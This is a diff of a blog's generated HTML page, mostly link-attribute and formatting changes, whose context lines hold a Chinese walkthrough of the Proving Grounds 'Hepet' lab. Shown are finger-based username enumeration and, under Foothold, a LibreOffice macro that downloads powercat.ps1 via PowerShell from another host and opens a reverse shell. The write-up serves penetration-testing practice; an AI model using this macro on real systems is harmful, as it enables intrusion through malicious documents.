@@ -165,9 +165,7 @@
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
@@ -209,7 +207,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Yiaos">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content>
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -284,8 +282,8 @@
 <p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=Njk0YTVlN2U1ZjViMWViMDU0ODZiN2I5MDYwNjM5MTJfV1hLZ2V0V0p4aDk4SEZzMEVMZzJNT29QWlZ1eW8wWXlfVG9rZW46Q2RoTmJtbXd5bzRtM3B4Z1JyMGMzSTJQbkxnXzE3NDAzMjUwODY6MTc0MDMyODY4Nl9WNA"></p>
 <h2 id="79-finger"><a href="#79-finger" class="headerlink" title="79 finger"></a>79 finger</h2><p>使用finger-user-enum.pl 枚举用户名</p>
 <blockquote>
-<p>github: <a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/finger-user-enum">https://github.com/pentestmonkey/finger-user-enum</a></p>
-<p>工具是在walkThrough: <a target="_blank" rel="noopener" href="https://medium.com/@huwanyu94/proving-grounds-practice-hepet-walkthrough-ee7e051af47b">https://medium.com/@huwanyu94/proving-grounds-practice-hepet-walkthrough-ee7e051af47b</a> 中看到的</p>
+<p>github: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/pentestmonkey/finger-user-enum">https://github.com/pentestmonkey/finger-user-enum</a></p>
+<p>工具是在walkThrough: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://medium.com/@huwanyu94/proving-grounds-practice-hepet-walkthrough-ee7e051af47b">https://medium.com/@huwanyu94/proving-grounds-practice-hepet-walkthrough-ee7e051af47b</a> 中看到的</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span> |grep -v <span class="string">&#x27;is not known&#x27;</span></span><br><span class="line">Starting finger-user-enum v1<span class="number">.0</span> ( http://pentestmonkey.net/tools/finger-user-enum )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">######## Scan started at Sun Feb 23 16:27:33 2025 #########</span></span><br><span class="line">admin@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: admin         Name: Mail System Administrator....[No profile information]..</span><br><span class="line">agnes@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: agnes         Name: Agnes....[No profile information]..</span><br><span class="line">charlotte@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: charlotte         Name: Charlotte....[No profile information]..</span><br><span class="line">jonas@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: jonas         Name: Jonas....[No profile information]..</span><br><span class="line">magnus@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: magnus         Name: Magnus....[No profile information]..</span><br><span class="line">martha@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: martha         Name: Martha....[No profile information]..</span><br></pre></td></tr></table></figure>
 
@@ -306,7 +304,7 @@
 <p>邮件内容是： 新来的PR要求大家把spreadsheet发给mailadmin; mainadmin告诉大家公司改用LibreOffice了，spreadsheet就是office中的excel,</p>
 <h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><p>新建一个恶意的ods文件, 操作方式如下：</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html">https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html">https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html</a></p>
 </blockquote>
 <p>反弹shell macros:</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub Main</span><br><span class="line">Shell(<span class="string">&quot;cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.45.234/powercat.ps1&#x27;);powercat -c 192.168.45.169 -p 4444 -e powershell&quot;</span>)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
@@ -346,7 +344,7 @@
     <a href="https://thiiiiink.com/post/20250223233825.html" title="Proving Grounds Practice - Hepet">https://thiiiiink.com/post/20250223233825.html</a>
   </li>
   <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
   </li>
 </ul>
 </div>
@@ -442,11 +440,11 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
   </div>
   <div class="cc-license motion-element" itemprop="license">
-    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
   </div>
 
 
